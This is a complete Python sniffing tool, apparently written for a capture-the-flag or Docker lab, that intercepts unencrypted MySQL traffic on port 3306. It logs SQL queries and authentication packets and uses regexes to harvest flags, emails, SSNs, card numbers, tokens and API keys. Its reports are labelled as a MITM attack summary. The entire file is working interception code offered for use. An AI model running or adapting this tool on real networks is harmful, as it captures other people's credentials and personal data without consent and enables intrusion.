#!/usr/bin/env python3

import argparse
import re
import subprocess
from scapy.all import sniff, TCP, IP, Raw
from datetime import datetime
import json


class MySQLTrafficAnalyzer:
    def __init__(self, output_file="captured_data.txt", verbose=False):
        self.captured_packets = []
        self.output_file = output_file
        self.verbose = verbose
        self.packet_count = 0
        self.sql_queries = []
        self.credentials = []
        self.sensitive_data = []
        
    def packet_handler(self, packet):
        if packet.haslayer(TCP) and packet.haslayer(Raw):
            if packet[TCP].sport == 3306 or packet[TCP].dport == 3306:
                try:
                    payload = bytes(packet[Raw].load)
                    
                    try:
                        decoded = payload.decode('utf-8', errors='ignore')
                    except:
                        decoded = str(payload)
                    
                    self.packet_count += 1
                    packet_info = {
                        'timestamp': datetime.now().isoformat(),
                        'src_ip': packet[IP].src if packet.haslayer(IP) else 'unknown',
                        'dst_ip': packet[IP].dst if packet.haslayer(IP) else 'unknown',
                        'src_port': packet[TCP].sport,
                        'dst_port': packet[TCP].dport,
                        'payload_hex': payload.hex(),
                        'payload_decoded': decoded,
                        'payload_length': len(payload)
                    }
                    
                    self.captured_packets.append(packet_info)
                    
                    self._analyze_traffic(packet_info, payload, decoded)
                        
                except Exception as e:
                    if self.verbose:
                        print(f"[!] Error processing packet: {e}")
    
    def _analyze_traffic(self, packet_info, payload, decoded):
        sql_keywords = ['SELECT', 'INSERT', 'UPDATE', 'DELETE', 'CREATE', 'DROP', 'ALTER']
        is_query = any(keyword in decoded.upper() for keyword in sql_keywords)
        
        auth_keywords = ['password', 'login', 'auth', 'user', 'credential']
        is_auth = any(keyword in decoded.lower() for keyword in auth_keywords)
        
        sensitive_patterns = [
            (r'FLAG\{[^}]+\}', 'FLAG'),
            (r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', 'EMAIL'),
            (r'\b\d{3}-\d{2}-\d{4}\b', 'SSN'),
            (r'\b\d{16}\b', 'CARD'),
            (r'token[\'"]?\s*[:=]\s*[\'"]?([^\'"]+)', 'TOKEN'),
            (r'api[_-]?key[\'"]?\s*[:=]\s*[\'"]?([^\'"]+)', 'API KEY'),
        ]
        

        if is_query:
            print(f"\n[{packet_info['timestamp']}] SQL Query Detected")
            print(f"Direction: {packet_info['src_ip']}:{packet_info['src_port']} → {packet_info['dst_ip']}:{packet_info['dst_port']}")
            
            query = self._extract_sql_query(decoded)
            if query:
                print(f"Query: {query}")
                self.sql_queries.append({'timestamp': packet_info['timestamp'], 'query': query})
        
        elif is_auth:
            print(f"\n[{packet_info['timestamp']}] Authentication Data Detected")
            print(f"Direction: {packet_info['src_ip']}:{packet_info['src_port']} → {packet_info['dst_ip']}:{packet_info['dst_port']}")
            if self.verbose:
                print(f"Data: {decoded[:200]}")
            self.credentials.append(packet_info)
        
        for pattern, data_type in sensitive_patterns:
            matches = re.findall(pattern, decoded, re.IGNORECASE)
            if matches:
                print(f"\n[{packet_info['timestamp']}] {data_type} FOUND!")
                print(f"Direction: {packet_info['src_ip']}:{packet_info['src_port']} → {packet_info['dst_ip']}:{packet_info['dst_port']}")
                for match in matches:
                    if isinstance(match, tuple):
                        match = match[0]
                    print(f"  → {match}")
                    self.sensitive_data.append({
                        'type': data_type,
                        'data': match,
                        'timestamp': packet_info['timestamp']
                    })
        
        if self.verbose and not is_query and not is_auth:
            if len(payload) > 10:
                print(f"\n[{packet_info['timestamp']}] Data Transfer ({len(payload)} bytes)")
                print(f"{packet_info['src_ip']}:{packet_info['src_port']} → {packet_info['dst_ip']}:{packet_info['dst_port']}")
                print(f"Payload preview: {decoded[:100]}")
    
    def _extract_sql_query(self, decoded):
        sql_keywords = ['SELECT', 'INSERT', 'UPDATE', 'DELETE', 'CREATE', 'DROP', 'ALTER', 'SHOW']
        
        for keyword in sql_keywords:
            idx = decoded.upper().find(keyword)
            if idx != -1:
                query = decoded[idx:].split('\x00')[0]
                query = query.strip().replace('\n', ' ').replace('\r', '')
                if len(query) > 200:
                    query = query[:200] + "..."
                return query
        
        return None
    
    def _print_packet(self, packet_info, payload, decoded):
        print("\n" + "="*80)
        print(f"[{packet_info['timestamp']}] Packet #{self.packet_count}")
        print(f"Source: {packet_info['src_ip']}:{packet_info['src_port']} → "
              f"Destination: {packet_info['dst_ip']}:{packet_info['dst_port']}")
        print(f"Length: {packet_info['payload_length']} bytes")
        print("-"*80)
        
        if len(decoded) > 0:
            print("Decoded Payload:")
            print(decoded[:500])
        
        print("="*80)
    
    def save_results(self):
        with open(self.output_file, 'w') as f:
            f.write(f"MITM Attack - Captured Traffic Analysis\n")
            f.write(f"Capture Time: {datetime.now().isoformat()}\n")
            f.write(f"Total Packets Captured: {len(self.captured_packets)}\n")
            f.write("="*80 + "\n\n")
            
            f.write("=== SUMMARY ===\n")
            f.write(f"SQL Queries Intercepted: {len(self.sql_queries)}\n")
            f.write(f"Authentication Events: {len(self.credentials)}\n")
            f.write(f"Sensitive Data Found: {len(self.sensitive_data)}\n")
            f.write("="*80 + "\n\n")
            
            if self.sql_queries:
                f.write("=== SQL QUERIES ===\n")
                for i, query_info in enumerate(self.sql_queries, 1):
                    f.write(f"\nQuery {i} [{query_info['timestamp']}]:\n")
                    f.write(f"{query_info['query']}\n")
                f.write("\n" + "="*80 + "\n\n")
            
            if self.sensitive_data:
                f.write("=== SENSITIVE DATA ===\n")
                for item in self.sensitive_data:
                    f.write(f"\n[{item['timestamp']}] {item['type']}\n")
                    f.write(f"Data: {item['data']}\n")
                f.write("\n" + "="*80 + "\n\n")
            
            f.write("=== ALL CAPTURED PACKETS ===\n")
            for i, packet in enumerate(self.captured_packets, 1):
                f.write(f"\nPacket {i}:\n")
                f.write(f"Timestamp: {packet['timestamp']}\n")
                f.write(f"Source: {packet['src_ip']}:{packet['src_port']}\n")
                f.write(f"Destination: {packet['dst_ip']}:{packet['dst_port']}\n")
                f.write(f"Length: {packet['payload_length']} bytes\n")
                f.write(f"Payload (decoded):\n{packet['payload_decoded'][:500]}\n")
                f.write("-"*80 + "\n")
        
        print(f"\n[+] Results saved to {self.output_file}")
        
        json_file = self.output_file.replace('.txt', '.json')
        analysis = {
            'summary': {
                'total_packets': len(self.captured_packets),
                'sql_queries': len(self.sql_queries),
                'auth_events': len(self.credentials),
                'sensitive_data_items': len(self.sensitive_data)
            },
            'sql_queries': self.sql_queries,
            'sensitive_data': self.sensitive_data,
            'packets': self.captured_packets
        }
        with open(json_file, 'w') as f:
            json.dump(analysis, f, indent=2)
        print(f"[+] JSON data saved to {json_file}")
    
    def print_summary(self):
        print("\n" + "="*80)
        print("MITM ATTACK SUMMARY")
        print("="*80)
        
        print(f"\n Statistics:")
        print(f"   Total Packets Captured: {len(self.captured_packets)}")
        print(f"   SQL Queries Intercepted: {len(self.sql_queries)}")
        print(f"   Authentication Events: {len(self.credentials)}")
        print(f"   Sensitive Data Items: {len(self.sensitive_data)}")
        
        if self.sql_queries:
            print(f"\n SQL Queries:")
            for i, query_info in enumerate(self.sql_queries[:5], 1):
                print(f"   {i}. {query_info['query'][:80]}...")
            if len(self.sql_queries) > 5:
                print(f"      ... and {len(self.sql_queries) - 5} more")
        
        if self.credentials:
            print(f"\n Authentication Events: {len(self.credentials)}")
        
        if self.sensitive_data:
            print(f"\n Sensitive Data Found:")
            by_type = {}
            for item in self.sensitive_data:
                data_type = item['type']
                if data_type not in by_type:
                    by_type[data_type] = []
                by_type[data_type].append(item)
            
            for data_type, items in by_type.items():
                print(f"\n   {data_type}:")
                for i, item in enumerate(items[:3], 1):
                    print(f"      {i}. {item['data']}")
                if len(items) > 3:
                    print(f"      ... and {len(items) - 3} more")
        
        print("\n" + "="*80)


def detect_docker_bridge():
    try:
        result = subprocess.run(['ip', 'link', 'show'], 
                                capture_output=True, 
                                text=True, 
                                check=True)
        
        for line in result.stdout.split('\n'):
            if 'br-' in line and 'state UP' in line:
                match = re.search(r'\d+:\s+(br-[a-f0-9]+):', line)
                if match:
                    interface = match.group(1)
                    return interface
        
        for line in result.stdout.split('\n'):
            if 'br-' in line:
                match = re.search(r'\d+:\s+(br-[a-f0-9]+):', line)
                if match:
                    interface = match.group(1)
                    return interface
        
        return None
        
    except subprocess.CalledProcessError:
        return None
    except Exception:
        return None


def main():
    parser = argparse.ArgumentParser()
    
    parser.add_argument('-i', '--interface')
    parser.add_argument('-c', '--count', type=int, default=0)
    parser.add_argument('-o', '--output', default='captured_data.txt')
    parser.add_argument('--filter', default='tcp port 3306')
    parser.add_argument('-v', '--verbose', action='store_true')
    
    args = parser.parse_args()
    
    if not args.interface:
        detected_interface = detect_docker_bridge()
        if detected_interface:
            args.interface = detected_interface
    
    print("\nMySQL Traffic Interceptor")
    print(f"Filter: {args.filter}")
    print(f"Output: {args.output}")
    print(f"Interface: {args.interface if args.interface else 'default'}")
    print(f"Packet limit: {'unlimited' if args.count == 0 else args.count}")
    print(f"\nStarting capture (Ctrl+C to stop)\n")
    
    analyzer = MySQLTrafficAnalyzer(output_file=args.output, verbose=args.verbose)
    
    try:
        sniff(
            filter=args.filter,
            prn=analyzer.packet_handler,
            iface=args.interface,
            count=args.count,
            store=False
        )
    except KeyboardInterrupt:
        print("\nCapture stopped")
    except PermissionError:
        print("\nPermission denied. Run with sudo")
        return
    except Exception as e:
        print(f"\n[!] Error: {e}")
        return
    
    analyzer.save_results()
    analyzer.print_summary()
    

if __name__ == "__main__":
    main()
